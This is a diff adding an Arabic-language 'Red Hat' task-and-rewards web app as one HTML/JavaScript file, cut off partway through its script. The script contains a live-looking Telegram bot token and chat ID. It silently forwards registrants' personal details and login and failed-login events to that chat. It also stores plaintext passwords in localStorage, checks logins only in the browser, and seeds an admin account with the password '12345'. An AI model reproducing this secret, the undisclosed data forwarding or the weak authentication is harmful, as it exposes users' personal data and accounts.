@@ -1,0 +1,1719 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Hat - نظام المهام</title>
+    <style>
+        :root {
+            --primary: #8B0000;
+            --primary-light: #A52A2A;
+            --primary-dark: #660000;
+            --black: #000000;
+            --dark: #1A0F0F;
+            --gray: #2A1A1A;
+            --light: #F5F5F5;
+            --white: #FFFFFF;
+            --gold: #D4AF37;
+            --green: #2ecc71;
+            --red: #e74c3c;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--dark);
+            color: var(--light);
+            direction: rtl;
+            background: linear-gradient(135deg, var(--black) 0%, var(--dark) 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 2px solid var(--primary);
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo h1 {
+            color: var(--primary);
+            font-size: 32px;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(139, 0, 0, 0.5);
+        }
+        
+        .hat {
+            color: var(--primary);
+            margin-left: 15px;
+            font-size: 28px;
+            animation: glow 2s infinite;
+        }
+        
+        @keyframes glow {
+            0% { text-shadow: 0 0 5px var(--primary); }
+            50% { text-shadow: 0 0 20px var(--primary), 0 0 30px var(--primary-light); }
+            100% { text-shadow: 0 0 5px var(--primary); }
+        }
+        
+        .btn {
+            background-color: var(--primary);
+            color: var(--white);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            font-size: 16px;
+        }
+        
+        .btn:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.4);
+        }
+        
+        .btn-secondary {
+            background-color: var(--gray);
+            color: var(--light);
+        }
+        
+        .btn-success {
+            background-color: var(--green);
+            color: var(--white);
+        }
+        
+        .btn-disabled {
+            background-color: #555;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        /* أنماط تسجيل الدخول والتسجيل */
+        .auth-container {
+            max-width: 500px;
+            margin: 50px auto;
+            background-color: var(--black);
+            padding: 40px;
+            border-radius: 15px;
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 30px rgba(139, 0, 0, 0.3);
+        }
+        
+        .auth-title {
+            color: var(--primary);
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--primary-light);
+            font-weight: bold;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            background-color: var(--dark);
+            border: 2px solid rgba(139, 0, 0, 0.3);
+            border-radius: 8px;
+            color: var(--light);
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 10px rgba(139, 0, 0, 0.3);
+        }
+        
+        .auth-footer {
+            text-align: center;
+            margin-top: 25px;
+        }
+        
+        .auth-link {
+            color: var(--primary);
+            cursor: pointer;
+            text-decoration: underline;
+            font-weight: bold;
+        }
+        
+        /* أنماط التبويبات */
+        .tabs {
+            display: flex;
+            margin-bottom: 25px;
+            border-bottom: 2px solid rgba(139, 0, 0, 0.3);
+            background-color: var(--black);
+            border-radius: 10px 10px 0 0;
+            overflow: hidden;
+            flex-wrap: wrap;
+        }
+        
+        .tab {
+            padding: 15px 25px;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: all 0.3s;
+            font-weight: bold;
+            flex: 1;
+            text-align: center;
+            min-width: 120px;
+        }
+        
+        .tab.active {
+            border-bottom: 3px solid var(--primary);
+            color: var(--primary);
+            background-color: var(--dark);
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 25px 0;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* أنماط المهام */
+        .tasks-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+        
+        .task-card {
+            background: linear-gradient(145deg, var(--gray) 0%, var(--dark) 100%);
+            border-radius: 12px;
+            padding: 20px;
+            border: 2px solid rgba(139, 0, 0, 0.2);
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .task-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+        }
+        
+        .task-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 25px rgba(139, 0, 0, 0.2);
+            border-color: rgba(139, 0, 0, 0.4);
+        }
+        
+        .task-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .task-title {
+            font-weight: bold;
+            color: var(--primary);
+            font-size: 20px;
+        }
+        
+        .task-points {
+            background-color: var(--primary);
+            color: var(--white);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .task-description {
+            margin-bottom: 20px;
+            color: var(--light);
+            line-height: 1.6;
+        }
+        
+        .task-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: var(--primary-light);
+            margin-bottom: 20px;
+            padding: 10px 0;
+            border-top: 1px solid rgba(139, 0, 0, 0.2);
+            border-bottom: 1px solid rgba(139, 0, 0, 0.2);
+        }
+        
+        .task-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .upload-section {
+            margin-top: 15px;
+            padding: 15px;
+            background-color: rgba(139, 0, 0, 0.1);
+            border-radius: 8px;
+            border: 1px dashed var(--primary);
+        }
+        
+        .upload-btn {
+            background-color: var(--primary);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 10px;
+            transition: all 0.3s;
+            display: block;
+        }
+        
+        .upload-btn:hover {
+            background-color: var(--primary-dark);
+        }
+        
+        /* أنماط المكافآت */
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+            margin-top: 20px;
+        }
+        
+        .reward-card {
+            background: linear-gradient(145deg, var(--gray) 0%, var(--dark) 100%);
+            border-radius: 12px;
+            padding: 25px 20px;
+            border: 2px solid rgba(139, 0, 0, 0.2);
+            transition: all 0.3s;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .reward-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+        }
+        
+        .reward-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 25px rgba(139, 0, 0, 0.2);
+            border-color: rgba(139, 0, 0, 0.4);
+        }
+        
+        .reward-icon {
+            font-size: 50px;
+            margin-bottom: 15px;
+            color: var(--primary);
+        }
+        
+        .reward-title {
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .reward-cost {
+            color: var(--primary-light);
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        /* أنماط التنبيهات */
+        .alert {
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            display: none;
+            font-weight: bold;
+            border: 2px solid transparent;
+        }
+        
+        .alert-success {
+            background-color: rgba(46, 204, 113, 0.2);
+            border-color: var(--green);
+            color: var(--green);
+        }
+        
+        .alert-error {
+            background-color: rgba(231, 76, 60, 0.2);
+            border-color: var(--red);
+            color: var(--red);
+        }
+        
+        .alert-info {
+            background-color: rgba(139, 0, 0, 0.2);
+            border-color: var(--primary);
+            color: var(--primary-light);
+        }
+        
+        /* أنماط لوحة المعلومات */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 25px;
+            margin-bottom: 35px;
+        }
+        
+        .stat-card {
+            background: linear-gradient(145deg, var(--gray) 0%, var(--dark) 100%);
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+            border: 2px solid rgba(139, 0, 0, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+        }
+        
+        .stat-value {
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--primary);
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(139, 0, 0, 0.3);
+        }
+        
+        .stat-label {
+            color: var(--primary-light);
+            font-weight: bold;
+        }
+        
+        /* أنماط القائمة العلوية */
+        .user-menu {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .user-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 10px rgba(139, 0, 0, 0.5);
+        }
+        
+        .points-display {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logout-btn {
+            background: none;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .logout-btn:hover {
+            background-color: var(--primary);
+            color: var(--white);
+        }
+        
+        /* تصميم متجاوب */
+        @media (max-width: 768px) {
+            .tasks-grid, .rewards-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .tabs {
+                flex-direction: column;
+            }
+            
+            .tab {
+                text-align: center;
+            }
+            
+            header {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .user-menu {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .container {
+                padding: 10px;
+            }
+        }
+        
+        /* أنماط إضافية */
+        .pending-approval {
+            background-color: rgba(212, 175, 55, 0.1);
+            border: 2px dashed var(--gold);
+        }
+        
+        .admin-panel {
+            background-color: rgba(139, 0, 0, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            border: 2px solid var(--primary);
+        }
+        
+        .admin-title {
+            color: var(--primary);
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 24px;
+        }
+        
+        .pending-tasks {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .task-image {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-top: 10px;
+            border: 1px solid var(--primary);
+            max-height: 200px;
+            object-fit: cover;
+        }
+        
+        .telegram-status {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .telegram-success {
+            background-color: rgba(46, 204, 113, 0.2);
+            border: 1px solid var(--green);
+            color: var(--green);
+        }
+        
+        .telegram-error {
+            background-color: rgba(231, 76, 60, 0.2);
+            border: 1px solid var(--red);
+            color: var(--red);
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .file-input {
+            display: none;
+        }
+        
+        .user-info {
+            background: rgba(139, 0, 0, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            border: 1px solid var(--primary);
+        }
+        
+        .user-info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(139, 0, 0, 0.2);
+        }
+        
+        .user-info-label {
+            color: var(--primary-light);
+            font-weight: bold;
+        }
+        
+        .user-info-value {
+            color: var(--light);
+        }
+        
+        .verification-code {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .verification-input {
+            flex: 1;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+    </style>
+</head>
+<body>
+    <!-- شاشة المصادقة -->
+    <div id="authPage" class="container">
+        <header>
+            <div class="logo">
+                <h1>Red Hat <span class="hat">🎩</span></h1>
+            </div>
+        </header>
+        
+        <div id="loginContainer" class="auth-container">
+            <h2 class="auth-title">تسجيل الدخول</h2>
+            
+            <div class="alert alert-error" id="loginError"></div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="loginEmail">البريد الإلكتروني</label>
+                    <input type="email" id="loginEmail" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="loginPassword">كلمة المرور</label>
+                    <input type="password" id="loginPassword" class="form-control" required>
+                </div>
+                
+                <button type="submit" class="btn" style="width: 100%;">تسجيل الدخول</button>
+            </form>
+            
+            <div class="auth-footer">
+                <span>ليس لديك حساب؟ </span>
+                <span class="auth-link" id="showRegister">سجل الآن</span>
+            </div>
+        </div>
+        
+        <div id="registerContainer" class="auth-container" style="display: none;">
+            <h2 class="auth-title">تسجيل حساب جديد</h2>
+            
+            <div class="alert alert-error" id="registerError"></div>
+            
+            <form id="registerForm">
+                <div class="form-group">
+                    <label for="regName">الاسم الكامل (مطلوب)</label>
+                    <input type="text" id="regName" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regEmail">البريد الإلكتروني (مطلوب)</label>
+                    <input type="email" id="regEmail" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regPhone">رقم الهاتف (مطلوب)</label>
+                    <input type="tel" id="regPhone" class="form-control" required pattern="[0-9]{10,15}">
+                </div>
+                
+                <div class="form-group">
+                    <label for="regAge">العمر (مطلوب)</label>
+                    <input type="number" id="regAge" class="form-control" min="16" max="100" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regCountry">البلد (مطلوب)</label>
+                    <input type="text" id="regCountry" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regCity">المدينة (مطلوب)</label>
+                    <input type="text" id="regCity" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="regPassword">كلمة المرور (مطلوب)</label>
+                    <input type="password" id="regPassword" class="form-control" required minlength="6">
+                </div>
+                
+                <button type="submit" class="btn" style="width: 100%;">تسجيل حساب</button>
+            </form>
+            
+            <div class="auth-footer">
+                <span>لديك حساب بالفعل؟ </span>
+                <span class="auth-link" id="showLogin">تسجيل الدخول</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- لوحة التحكم بعد تسجيل الدخول -->
+    <div id="dashboard" class="container" style="display: none;">
+        <header>
+            <div class="logo">
+                <h1>Red Hat <span class="hat">🎩</span></h1>
+            </div>
+            <div class="user-menu">
+                <span id="welcomeMessage"></span>
+                <div class="points-display" id="pointsDisplay">0 نقطة</div>
+                <img id="userAvatar" class="user-avatar" src="https://ui-avatars.com/api/?name=مستخدم&background=8B0000&color=fff">
+                <button id="logoutBtn" class="logout-btn">تسجيل الخروج</button>
+            </div>
+        </header>
+        
+        <div class="alert alert-success" id="successAlert"></div>
+        <div class="alert alert-error" id="errorAlert"></div>
+        <div class="alert alert-info" id="infoAlert"></div>
+        
+        <!-- معلومات المستخدم الشخصية -->
+        <div class="user-info">
+            <h3 style="color: var(--primary); margin-bottom: 15px; text-align: center;">المعلومات الشخصية</h3>
+            <div class="user-info-item">
+                <span class="user-info-label">الاسم الكامل:</span>
+                <span class="user-info-value" id="userFullName"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">البريد الإلكتروني:</span>
+                <span class="user-info-value" id="userEmail"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">رقم الهاتف:</span>
+                <span class="user-info-value" id="userPhone"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">العمر:</span>
+                <span class="user-info-value" id="userAge"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">البلد:</span>
+                <span class="user-info-value" id="userCountry"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">المدينة:</span>
+                <span class="user-info-value" id="userCity"></span>
+            </div>
+            <div class="user-info-item">
+                <span class="user-info-label">تاريخ التسجيل:</span>
+                <span class="user-info-value" id="userJoinDate"></span>
+            </div>
+        </div>
+        
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-value" id="totalPoints">0</div>
+                <div class="stat-label">إجمالي النقاط</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="completedTasks">0</div>
+                <div class="stat-label">المهام المكتملة</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="pendingTasks">0</div>
+                <div class="stat-label">في انتظار المراجعة</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="claimedRewards">0</div>
+                <div class="stat-label">المكافآت المستلمة</div>
+            </div>
+        </div>
+        
+        <div class="tabs">
+            <div class="tab active" data-tab="tasks">المهام</div>
+            <div class="tab" data-tab="rewards">المكافآت</div>
+            <div class="tab" data-tab="addTask">إضافة مهمة</div>
+            <div id="adminTab" class="tab" data-tab="admin" style="display: none;">لوحة المراجعة</div>
+        </div>
+        
+        <div class="tab-content active" id="tasksTab">
+            <h2 style="color: var(--primary); margin-bottom: 20px; text-align: center;">المهام المتاحة</h2>
+            <div class="tasks-grid" id="tasksContainer">
+                <!-- سيتم ملؤها بالمهام من localStorage -->
+            </div>
+        </div>
+        
+        <div class="tab-content" id="rewardsTab">
+            <h2 style="color: var(--primary); margin-bottom: 20px; text-align: center;">المكافآت المتاحة</h2>
+            <div class="rewards-grid" id="rewardsContainer">
+                <!-- سيتم ملؤها بالمكافآت من localStorage -->
+            </div>
+        </div>
+        
+        <div class="tab-content" id="addTaskTab">
+            <h2 style="color: var(--primary); margin-bottom: 20px; text-align: center;">إضافة مهمة جديدة</h2>
+            <form id="taskForm" style="max-width: 700px; margin: 0 auto;">
+                <div class="form-group">
+                    <label for="taskTitle">عنوان المهمة</label>
+                    <input type="text" id="taskTitle" class="form-control" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="taskDescription">وصف المهمة</label>
+                    <textarea id="taskDescription" class="form-control" rows="4" required></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label for="taskPoints">النقاط الممنوحة</label>
+                    <input type="number" id="taskPoints" class="form-control" min="1" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="taskDeadline">موعد التسليم (اختياري)</label>
+                    <input type="date" id="taskDeadline" class="form-control">
+                </div>
+                
+                <div class="form-group">
+                    <label for="taskCategory">الفئة</label>
+                    <select id="taskCategory" class="form-control" required>
+                        <option value="work">عمل</option>
+                        <option value="study">دراسة</option>
+                        <option value="personal">شخصي</option>
+                        <option value="health">صحة</option>
+                        <option value="other">أخرى</option>
+                    </select>
+                </div>
+                
+                <button type="submit" class="btn">إضافة المهمة</button>
+            </form>
+        </div>
+        
+        <div class="tab-content" id="adminTabContent">
+            <div class="admin-panel">
+                <h2 class="admin-title">لوحة مراجعة المهام</h2>
+                <div id="telegramStatus"></div>
+                <div class="pending-tasks" id="pendingTasksContainer">
+                    <!-- سيتم ملؤها بالمهام المنتظرة للمراجعة -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات بوت التلجرام
+        const TELEGRAM_BOT_TOKEN = '8162543417:AAGPbVJTjsWdSK4Q-B5EcqRyiQg4BkLDWA8';
+        const TELEGRAM_CHAT_ID = '7128516168';
+        
+        // بيانات المستخدمين
+        let users = JSON.parse(localStorage.getItem('redHatUsers')) || [
+            {
+                id: 1,
+                email: 'admin@redhat.com',
+                password: '12345',
+                name: 'مدير النظام',
+                phone: '+966500000000',
+                age: 30,
+                country: 'السعودية',
+                city: 'الرياض',
+                points: 100,
+                completedTasks: [],
+                pendingTasks: [],
+                claimedRewards: [],
+                role: 'admin',
+                joinDate: new Date().toISOString(),
+                lastLogin: null
+            }
+        ];
+        
+        // بيانات المهام
+        let tasks = JSON.parse(localStorage.getItem('redHatTasks')) || [
+            {
+                id: 1,
+                title: 'تصوير غروب الشمس',
+                description: 'قم بتصوير غروب الشمس في مكان مفتوح وأرسل الصورة',
+                points: 25,
+                deadline: null,
+                category: 'personal',
+                createdBy: 'admin@redhat.com',
+                createdAt: new Date().toISOString()
+            },
+            {
+                id: 2,
+                title: 'تصوير وجبة صحية',
+                description: 'قم بإعداد وجبة صحية وقم بتصويرها',
+                points: 30,
+                deadline: null,
+                category: 'health',
+                createdBy: 'admin@redhat.com',
+                createdAt: new Date().toISOString()
+            }
+        ];
+        
+        // بيانات المكافآت
+        let rewards = JSON.parse(localStorage.getItem('redHatRewards')) || [
+            {
+                id: 1,
+                title: 'قسيمة طعام',
+                description: 'قسيمة بقيمة 50 ريال لمطعمك المفضل',
+                cost: 100,
+                category: 'food',
+                createdBy: 'admin@redhat.com',
+                createdAt: new Date().toISOString()
+            },
+            {
+                id: 2,
+                title: 'اشتراك شهري',
+                description: 'اشتراك لمدة شهر في خدمة البث المفضلة لديك',
+                cost: 150,
+                category: 'entertainment',
+                createdBy: 'admin@redhat.com',
+                createdAt: new Date().toISOString()
+            }
+        ];
+        
+        // المهام المنتظرة للمراجعة
+        let pendingReviews = JSON.parse(localStorage.getItem('redHatPendingReviews')) || [];
+        
+        // المستخدم الحالي
+        let currentUser = null;
+        
+        // تهيئة النظام
+        document.addEventListener('DOMContentLoaded', function() {
+            // التحقق من وجود مستخدم مسجل دخول
+            const loggedInUser = JSON.parse(localStorage.getItem('currentUser'));
+            if (loggedInUser) {
+                currentUser = loggedInUser;
+                showDashboard();
+            }
+            
+            // أحداث تسجيل الدخول والتسجيل
+            document.getElementById('showRegister').addEventListener('click', showRegisterForm);
+            document.getElementById('showLogin').addEventListener('click', showLoginForm);
+            document.getElementById('loginForm').addEventListener('submit', loginUser);
+            document.getElementById('registerForm').addEventListener('submit', registerUser);
+            
+            // أحداث لوحة التحكم
+            document.getElementById('logoutBtn').addEventListener('click', logoutUser);
+            
+            // أحداث التبويبات
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    switchTab(this.dataset.tab);
+                });
+            });
+            
+            // أحداث النماذج
+            document.getElementById('taskForm').addEventListener('submit', addTask);
+            
+            // اختبار اتصال التلجرام
+            testTelegramConnection();
+        });
+        
+        // اختبار اتصال التلجرام
+        async function testTelegramConnection() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    console.log('✅ اتصال التلجرام نشط:', data.result.username);
+                } else {
+                    console.error('❌ خطأ في اتصال التلجرام:', data);
+                }
+            } catch (error) {
+                console.error('❌ فشل اختبار اتصال التلجرام:', error);
+            }
+        }
+        
+        // عرض نموذج التسجيل
+        function showRegisterForm() {
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('registerContainer').style.display = 'block';
+            document.getElementById('registerError').style.display = 'none';
+        }
+        
+        // عرض نموذج تسجيل الدخول
+        function showLoginForm() {
+            document.getElementById('registerContainer').style.display = 'none';
+            document.getElementById('loginContainer').style.display = 'block';
+            document.getElementById('loginError').style.display = 'none';
+        }
+        
+        // تسجيل مستخدم جديد
+        async function registerUser(e) {
+            e.preventDefault();
+            
+            const name = document.getElementById('regName').value;
+            const email = document.getElementById('regEmail').value;
+            const phone = document.getElementById('regPhone').value;
+            const age = document.getElementById('regAge').value;
+            const country = document.getElementById('regCountry').value;
+            const city = document.getElementById('regCity').value;
+            const password = document.getElementById('regPassword').value;
+            const errorAlert = document.getElementById('registerError');
+            
+            // التحقق من صحة البريد الإلكتروني
+            if (!isValidEmail(email)) {
+                errorAlert.textContent = 'البريد الإلكتروني غير صحيح';
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            // التحقق من صحة رقم الهاتف
+            if (!isValidPhone(phone)) {
+                errorAlert.textContent = 'رقم الهاتف يجب أن يحتوي على 10 إلى 15 رقمًا';
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            // التحقق من العمر
+            if (age < 16 || age > 100) {
+                errorAlert.textContent = 'العمر يجب أن يكون بين 16 و 100 سنة';
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            // التحقق من عدم وجود مستخدم بنفس البريد الإلكتروني
+            if (users.some(u => u.email === email)) {
+                errorAlert.textContent = 'البريد الإلكتروني مسجل بالفعل';
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            // التحقق من عدم وجود مستخدم بنفس رقم الهاتف
+            if (users.some(u => u.phone === phone)) {
+                errorAlert.textContent = 'رقم الهاتف مسجل بالفعل';
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            // إضافة المستخدم الجديد
+            const newUser = {
+                id: Date.now(),
+                email,
+                password,
+                name,
+                phone,
+                age: parseInt(age),
+                country,
+                city,
+                points: 0,
+                completedTasks: [],
+                pendingTasks: [],
+                claimedRewards: [],
+                role: 'user',
+                joinDate: new Date().toISOString(),
+                lastLogin: null
+            };
+            
+            users.push(newUser);
+            localStorage.setItem('redHatUsers', JSON.stringify(users));
+            
+            // إرسال إشعار للتلجرام
+            await sendTelegramNotification(
+                '🆕 تسجيل مستخدم جديد!',
+                `📝 تم تسجيل مستخدم جديد في النظام:\n\n` +
+                `👤 الاسم: ${name}\n` +
+                `📧 البريد: ${email}\n` +
+                `📞 الهاتف: ${phone}\n` +
+                `🎂 العمر: ${age}\n` +
+                `🌍 البلد: ${country}\n` +
+                `🏙️ المدينة: ${city}\n` +
+                `⏰ وقت التسجيل: ${new Date().toLocaleString('ar-EG')}`
+            );
+            
+            showAlert('success', 'تم تسجيل الحساب بنجاح! يمكنك تسجيل الدخول الآن');
+            showLoginForm();
+            document.getElementById('registerForm').reset();
+        }
+        
+        // تسجيل الدخول
+        async function loginUser(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            const errorAlert = document.getElementById('loginError');
+            
+            const user = users.find(u => u.email === email && u.password === password);
+            
+            if (user) {
+                // تحديث وقت آخر دخول
+                user.lastLogin = new Date().toISOString();
+                const userIndex = users.findIndex(u => u.email === email);
+                users[userIndex] = user;
+                localStorage.setItem('redHatUsers', JSON.stringify(users));
+                
+                currentUser = user;
+                localStorage.setItem('currentUser', JSON.stringify(user));
+                
+                // إرسال إشعار دخول للتلجرام
+                await sendTelegramNotification(
+                    '🔐 تسجيل دخول',
+                    `👤 المستخدم: ${user.name}\n` +
+                    `📧 البريد: ${user.email}\n` +
+                    `📞 الهاتف: ${user.phone}\n` +
+                    `⏰ وقت الدخول: ${new Date().toLocaleString('ar-EG')}\n` +
+                    `🌐 العنوان: ${window.location.href}`
+                );
+                
+                showDashboard();
+            } else {
+                errorAlert.textContent = 'البريد الإلكتروني أو كلمة المرور غير صحيحة';
+                errorAlert.style.display = 'block';
+                
+                // إرسال إشعار محاولة دخول فاشلة
+                await sendTelegramNotification(
+                    '⚠️ محاولة دخول فاشلة',
+                    `📧 البريد: ${email}\n` +
+                    `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
+                    `🌐 العنوان: ${window.location.href}`
+                );
+            }
+        }
+        
+        // تسجيل الخروج
+        async function logoutUser() {
+            // إرسال إشعار خروج للتلجرام
+            if (currentUser) {
+                await sendTelegramNotification(
+                    '🚪 تسجيل خروج',
+                    `👤 المستخدم: ${currentUser.name}\n` +
+                    `📧 البريد: ${currentUser.email}\n` +
+                    `⏰ وقت الخروج: ${new Date().toLocaleString('ar-EG')}`
+                );
+            }
+            
+            localStorage.removeItem('currentUser');
+            currentUser = null;
+            location.reload();
+        }
+        
+        // التحقق من صحة البريد الإلكتروني
+        function isValidEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        // التحقق من صحة رقم الهاتف
+        function isValidPhone(phone) {
+            const phoneRegex = /^[0-9]{10,15}$/;
+            return phoneRegex.test(phone);
+        }
+        
+        // عرض لوحة التحكم
+        function showDashboard() {
+            document.getElementById('authPage').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            
+            document.getElementById('welcomeMessage').textContent = `مرحباً، ${currentUser.name}`;
+            document.getElementById('userAvatar').src = `https://ui-avatars.com/api/?name=${encodeURIComponent(currentUser.name)}&background=8B0000&color=fff`;
+            
+            // تحديث المعلومات الشخصية
+            document.getElementById('userFullName').textContent = currentUser.name;
+            document.getElementById('userEmail').textContent = currentUser.email;
+            document.getElementById('userPhone').textContent = currentUser.phone;
+            document.getElementById('userAge').textContent = currentUser.age + ' سنة';
